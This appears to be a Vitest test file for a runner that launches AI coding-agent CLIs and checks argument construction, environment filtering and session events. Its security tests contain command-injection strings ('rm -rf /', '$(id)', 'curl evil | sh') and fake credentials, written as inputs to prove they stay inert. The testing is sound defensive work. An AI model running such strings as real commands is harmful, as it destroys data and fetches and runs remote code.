import { EventEmitter } from 'node:events'
import { describe, expect, it, vi } from 'vitest'
import {
  AgentNotInstalledError,
  AgentProcessFailedError,
  createCliSessionRunner,
  type CliLaunchOrder,
  type SpawnedCliProcess,
} from '../../../src/technical/Cli/CliSessionRunner.js'
import { argumentsOf } from '../../../src/technical/Cli/AgentManifest.js'
import {
  AGENT_MANIFESTS,
  COPILOT_MANIFEST,
  DROID_MANIFEST,
  KIMI_MANIFEST,
  OPENCODE_MANIFEST,
} from '../../../src/technical/Cli/AgentManifests.js'
import { isCommandInstalled } from '../../../src/technical/Cli/AgentAvailability.js'

const ORDER: CliLaunchOrder = {
  storyId: 7,
  reference: 'FORGE-7',
  phase: 'spec',
  agentName: 'architecte',
  prompt: 'ecris la story',
}

function fakeChild(lines: readonly string[], exitCode: number | null = 0): SpawnedCliProcess & EventEmitter {
  const emitter = new EventEmitter() as EventEmitter & SpawnedCliProcess
  async function* stream(): AsyncGenerator<string> {
    for (const line of lines) {
      yield `${line}\n`
    }
  }
  emitter.stdout = stream()
  queueMicrotask(() => emitter.emit('close', exitCode))
  return emitter
}

describe('argumentsOf', () => {
  it('builds the opencode headless call in the story directory', () => {
    expect(argumentsOf(OPENCODE_MANIFEST, { prompt: 'p', cwd: '/w' })).toEqual([
      'run',
      '--format',
      'json',
      '--auto',
      '--dir',
      '/w',
      'p',
    ])
  })

  it('adds the model only when one is asked for', () => {
    expect(argumentsOf(OPENCODE_MANIFEST, { prompt: 'p', cwd: '/w', model: 'anthropic/sonnet' })).toContain(
      'anthropic/sonnet',
    )
    expect(argumentsOf(KIMI_MANIFEST, { prompt: 'p', cwd: '/w' })).not.toContain('--model')
  })

  it('builds the kimi print call with the prompt as one argument', () => {
    expect(argumentsOf(KIMI_MANIFEST, { prompt: 'a b; rm -rf /', cwd: '/w' })).toEqual([
      '--print',
      '--output-format',
      'stream-json',
      '--work-dir',
      '/w',
      '--prompt',
      'a b; rm -rf /',
    ])
  })

  it('does not expand placeholders found inside the prompt', () => {
    expect(argumentsOf(KIMI_MANIFEST, { prompt: '{cwd} {model}', cwd: '/w' })).toContain('{cwd} {model}')
  })
})

describe('AGENT_MANIFESTS', () => {
  it('gives every agent its own name and command', () => {
    expect(new Set(AGENT_MANIFESTS.map((manifest) => manifest.name)).size).toBe(AGENT_MANIFESTS.length)
    expect(AGENT_MANIFESTS.map((manifest) => manifest.name)).toEqual(['opencode', 'kimi', 'droid', 'copilot'])
  })

  it('builds the droid call with the autonomy level and the story directory', () => {
    expect(argumentsOf(DROID_MANIFEST, { prompt: 'p', cwd: '/w', model: 'm' })).toEqual([
      'exec',
      '--output-format',
      'stream-json',
      '--auto',
      'medium',
      '--cwd',
      '/w',
      '--model',
      'm',
      'p',
    ])
  })

  it('builds the copilot call', () => {
    expect(argumentsOf(COPILOT_MANIFEST, { prompt: 'p', cwd: '/w' })).toEqual(['--prompt', 'p', '--allow-all'])
  })
})

describe.each(AGENT_MANIFESTS)('security of the $name manifest', (manifest) => {
  const HOSTILE = '"; rm -rf / #`id` $(id) && curl evil | sh\n--yolo'

  it('keeps a hostile prompt as exactly one argument', () => {
    const args = argumentsOf(manifest, { prompt: HOSTILE, cwd: '/w' })
    expect(args.filter((arg) => arg === HOSTILE)).toHaveLength(1)
    expect(args.filter((arg) => arg.includes('rm -rf'))).toHaveLength(1)
  })

  it('keeps a hostile model name as exactly one argument', () => {
    const args = argumentsOf(manifest, { prompt: 'p', cwd: '/w', model: HOSTILE })
    expect(args.filter((arg) => arg.includes('rm -rf')).length).toBeLessThanOrEqual(1)
  })

  it('does not forward secrets that belong to other tools', async () => {
    vi.stubEnv('AWS_SECRET_ACCESS_KEY', 'aws-secret')
    vi.stubEnv('DATABASE_URL', 'mysql://root:pw@db/forge')
    vi.stubEnv('FORGE_ADMIN_PASSWORD', 'admin-secret')
    let seen: NodeJS.ProcessEnv = {}
    const runner = createCliSessionRunner({
      manifest,
      cwdFor: () => '/tmp',
      onEvent: () => undefined,
      spawnProcess: (_command, _args, options) => {
        seen = options.env
        return fakeChild([])
      },
    })

    await runner.launch(ORDER)
    vi.unstubAllEnvs()

    expect(seen.AWS_SECRET_ACCESS_KEY).toBeUndefined()
    expect(seen.DATABASE_URL).toBeUndefined()
    expect(seen.FORGE_ADMIN_PASSWORD).toBeUndefined()
  })

  it('forwards the login variables the person set for this agent', async () => {
    const own = `${manifest.environmentPrefixes[0]}LOGIN_FOR_TEST`
    vi.stubEnv(own, 'mine')
    let seen: NodeJS.ProcessEnv = {}
    const runner = createCliSessionRunner({
      manifest,
      cwdFor: () => '/tmp',
      onEvent: () => undefined,
      spawnProcess: (_command, _args, options) => {
        seen = options.env
        return fakeChild([])
      },
    })

    await runner.launch(ORDER)
    vi.unstubAllEnvs()

    expect(seen[own]).toBe('mine')
  })

  it('tells the agent which story and phase it works on', async () => {
    let seen: NodeJS.ProcessEnv = {}
    const runner = createCliSessionRunner({
      manifest,
      cwdFor: () => '/tmp',
      onEvent: () => undefined,
      spawnProcess: (_command, _args, options) => {
        seen = options.env
        return fakeChild([])
      },
    })

    await runner.launch(ORDER)

    expect(seen.FORGE_STORY_REFERENCE).toBe('FORGE-7')
    expect(seen.FORGE_PHASE).toBe('spec')
  })
})

describe('createCliSessionRunner', () => {
  it('starts the manifest command in the story directory and returns a session id', async () => {
    let seenCommand = ''
    let seenCwd = ''
    const runner = createCliSessionRunner({
      manifest: KIMI_MANIFEST,
      cwdFor: () => '/tmp/forge-7',
      onEvent: () => undefined,
      spawnProcess: (command, _args, options) => {
        seenCommand = command
        seenCwd = options.cwd
        return fakeChild(['{"type":"message"}'])
      },
    })

    const result = await runner.launch(ORDER)

    expect(seenCommand).toBe('kimi')
    expect(seenCwd).toBe('/tmp/forge-7')
    expect(result.claudeSessionId.length).toBeGreaterThan(0)
  })

  it('relays each output line as a session event named after the agent', async () => {
    const events: { name: string; payload: Record<string, unknown> }[] = []
    const runner = createCliSessionRunner({
      manifest: OPENCODE_MANIFEST,
      cwdFor: () => '/tmp',
      onEvent: (event) => events.push(event),
      spawnProcess: () => fakeChild(['one', 'two']),
    })

    await runner.launch(ORDER)

    const lines = events.filter((event) => event.name.endsWith('_line'))
    expect(lines.map((event) => event.name)).toEqual(['session.opencode_line', 'session.opencode_line'])
    expect(lines[1]?.payload.line).toBe('two')
  })

  it('reports the session as working once, before the first line', async () => {
    const names: string[] = []
    const runner = createCliSessionRunner({
      manifest: KIMI_MANIFEST,
      cwdFor: () => '/tmp',
      onEvent: (event) => names.push(event.name),
      spawnProcess: () => fakeChild(['a', 'b']),
    })

    await runner.launch(ORDER)

    expect(names).toEqual(['session.working', 'session.kimi_line', 'session.kimi_line'])
  })

  it('says nothing about work when the agent prints nothing', async () => {
    const names: string[] = []
    const runner = createCliSessionRunner({
      manifest: KIMI_MANIFEST,
      cwdFor: () => '/tmp',
      onEvent: (event) => names.push(event.name),
      spawnProcess: () => fakeChild([]),
    })

    await runner.launch(ORDER)

    expect(names).toEqual([])
  })

  it('refuses when the process exits with an error', async () => {
    const runner = createCliSessionRunner({
      manifest: KIMI_MANIFEST,
      cwdFor: () => '/tmp',
      onEvent: () => undefined,
      spawnProcess: () => fakeChild(['boom'], 2),
    })

    await expect(runner.launch(ORDER)).rejects.toThrow(AgentProcessFailedError)
  })

  it('says so when the agent is not installed on the machine', async () => {
    const runner = createCliSessionRunner({
      manifest: KIMI_MANIFEST,
      cwdFor: () => '/tmp',
      onEvent: () => undefined,
      spawnProcess: () => {
        const emitter = new EventEmitter() as EventEmitter & SpawnedCliProcess
        emitter.stdout = (async function* () {})()
        queueMicrotask(() => emitter.emit('error', Object.assign(new Error('spawn kimi ENOENT'), { code: 'ENOENT' })))
        return emitter
      },
    })

    await expect(runner.launch(ORDER)).rejects.toThrow(AgentNotInstalledError)
  })

  it('replays the previous turn in the prompt when resuming', async () => {
    const prompts: string[] = []
    const runner = createCliSessionRunner({
      manifest: KIMI_MANIFEST,
      cwdFor: () => '/tmp',
      onEvent: () => undefined,
      spawnProcess: (_command, args) => {
        prompts.push(args[args.length - 1] ?? '')
        return fakeChild(['answer'])
      },
    })

    const first = await runner.launch(ORDER)
    await runner.launch({ ...ORDER, resumeSessionId: first.claudeSessionId, prompt: 'continue' })

    expect(prompts[0]).toBe('ecris la story')
    expect(prompts[1]).toContain('ecris la story')
    expect(prompts[1]).toContain('continue')
  })
})

describe('isCommandInstalled', () => {
  it('finds a command that sits on the path', () => {
    expect(isCommandInstalled('node', process.env.PATH)).toBe(true)
  })

  it('reports a command that is nowhere on the path', () => {
    expect(isCommandInstalled('forge-no-such-agent', process.env.PATH)).toBe(false)
  })

  it('reports nothing installed on an empty path', () => {
    expect(isCommandInstalled('node', undefined)).toBe(false)
  })
})
